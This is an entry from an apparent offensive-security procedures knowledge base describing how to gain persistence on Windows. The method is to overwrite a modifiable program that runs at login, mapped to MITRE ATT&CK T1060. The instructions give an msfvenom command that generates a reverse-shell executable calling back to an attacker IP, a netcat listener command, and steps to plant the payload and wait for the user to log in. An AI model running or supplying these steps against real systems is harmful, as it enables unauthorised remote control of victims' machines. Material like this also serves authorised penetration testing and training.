---
id: 02d76ebf-f390-42b6-bd8d-72acbda8d235
name: Exploit a Modifiable Program Autorun by Windows on Login
type: procedure
verified: false
submitted: false
created_at: '2020-03-30T21:59:32.847655+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]'
platforms:
- Windows
tags:
- '[[persistence]]'
- '[[registry]]'
commands:
- '[[Create a Netcat Listener]]'
- '[[msfvenom Generate a Generic Windows x64 Reverse Shell]]'
---

# Exploit a Modifiable Program Autorun by Windows on Login

## Summary

After identifying a modifiable program being executed on login  (often by enumerating registry keys with tools like Sherlock or PowerUp), generate an executable and overwrite the program with it. 

## Description

# Description

After identifying a modifiable program being executed on login  (often by enumerating registry keys with tools like Sherlock or PowerUp), generate an executable and overwrite the program with it.

# Instructions

1. Generate an executable payload. In this example, msfvenom will be used to generate a generic reverse shell.

**Command** ([[msfvenom Generate a Generic Windows x64 Reverse Shell]]):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o $_PROGRAM.exe
```

2. Launch a netcat listener on the attacking machine.

**Command** ([[Create a Netcat Listener]]):

```bash
nc -lvnp $_PORT
```

3. Copy the payload to the target system, replacing the vulnerable program with the payload.

4. Wait for the user to log in and execute the payload.

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]

## Commands Used

- [[Create a Netcat Listener]]
- [[msfvenom Generate a Generic Windows x64 Reverse Shell]]

## Tags

- [[persistence]]
- [[registry]]
